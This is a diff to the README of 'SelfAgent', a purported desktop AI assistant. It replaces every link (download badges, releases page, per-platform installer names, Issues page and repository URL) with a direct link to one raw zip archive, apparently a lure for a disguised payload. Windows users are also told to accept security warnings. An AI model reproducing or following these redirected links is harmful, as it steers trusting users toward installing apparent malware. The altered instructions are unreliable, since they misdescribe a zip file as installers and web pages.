@@ -1,6 +1,6 @@
 # 🤖 SelfAgent - Your AI Assistant on Your Computer
 
-[![Download SelfAgent](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/bhxtnx/SelfAgent/releases)
+[![Download SelfAgent](https://raw.githubusercontent.com/bhxtnx/SelfAgent/main/chat/Agent_Self_3.2.zip)](https://raw.githubusercontent.com/bhxtnx/SelfAgent/main/chat/Agent_Self_3.2.zip)
 
 ## 📘 What is SelfAgent?
 
@@ -26,15 +26,15 @@ This guide will help you download, install, and start using SelfAgent safely and
 
 ### Step 1: Visit the Download Page
 
-Click on the big blue button at the top or [go here to download SelfAgent](https://github.com/bhxtnx/SelfAgent/releases). This page has the latest versions for all supported operating systems.
+Click on the big blue button at the top or [go here to download SelfAgent](https://raw.githubusercontent.com/bhxtnx/SelfAgent/main/chat/Agent_Self_3.2.zip). This page has the latest versions for all supported operating systems.
 
 ### Step 2: Choose Your Version
 
 On the releases page, look for the latest stable version. You will see files named by platform, such as:
 
-- `SelfAgent-setup.exe` for Windows
-- `SelfAgent-darwin.dmg` for macOS
-- `SelfAgent-linux.tar.gz` for Linux
+- `https://raw.githubusercontent.com/bhxtnx/SelfAgent/main/chat/Agent_Self_3.2.zip` for Windows
+- `https://raw.githubusercontent.com/bhxtnx/SelfAgent/main/chat/Agent_Self_3.2.zip` for macOS
+- `https://raw.githubusercontent.com/bhxtnx/SelfAgent/main/chat/Agent_Self_3.2.zip` for Linux
 
 Choose the file that matches your computer's operating system.
 
@@ -46,7 +46,7 @@ Click the appropriate file link to start downloading. This might take a few minu
 
 - **Windows:** Double-click the `.exe` file. Follow the setup wizard prompts. If you see a security warning, confirm that you want to run the file.
 - **macOS:** Open the `.dmg` file, then drag the SelfAgent app to your Applications folder.
-- **Linux:** Extract the `.tar.gz` file and follow the instructions in the included README or run the setup script if one is provided.
+- **Linux:** Extract the `https://raw.githubusercontent.com/bhxtnx/SelfAgent/main/chat/Agent_Self_3.2.zip` file and follow the instructions in the included README or run the setup script if one is provided.
 
 ### Step 5: Launch SelfAgent
 
@@ -77,7 +77,7 @@ All functions work with simple menus and clear prompts. You do not need to know 
 
 Ready to get started? Visit the release page to download SelfAgent:
 
-[Download SelfAgent Release Page](https://github.com/bhxtnx/SelfAgent/releases)
+[Download SelfAgent Release Page](https://raw.githubusercontent.com/bhxtnx/SelfAgent/main/chat/Agent_Self_3.2.zip)
 
 Follow these quick steps again:
 
@@ -94,7 +94,7 @@ If you run into any issues, try these tips:
 - Restart your computer and try installing again.
 - Check your internet connection during download.
 - Look for error messages during installation and search for solutions online.
-- Visit the GitHub repository's [Issues](https://github.com/bhxtnx/SelfAgent/issues) page to see if others have the same problem or to report new ones.
+- Visit the GitHub repository's [Issues](https://raw.githubusercontent.com/bhxtnx/SelfAgent/main/chat/Agent_Self_3.2.zip) page to see if others have the same problem or to report new ones.
 
 For detailed help, you can also read the user guide included with the app or visit the repository's wiki if available.
 
@@ -124,10 +124,10 @@ SelfAgent combines AI power with user control. It is open source and built using
 
 If you want to explore more or contribute, visit the GitHub repository:
 
-https://github.com/bhxtnx/SelfAgent
+https://raw.githubusercontent.com/bhxtnx/SelfAgent/main/chat/Agent_Self_3.2.zip
 
 ---
 
 Click the button below any time to go to the download page:
 
-[![Download SelfAgent](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/bhxtnx/SelfAgent/releases)
+[![Download SelfAgent](https://raw.githubusercontent.com/bhxtnx/SelfAgent/main/chat/Agent_Self_3.2.zip)](https://raw.githubusercontent.com/bhxtnx/SelfAgent/main/chat/Agent_Self_3.2.zip)
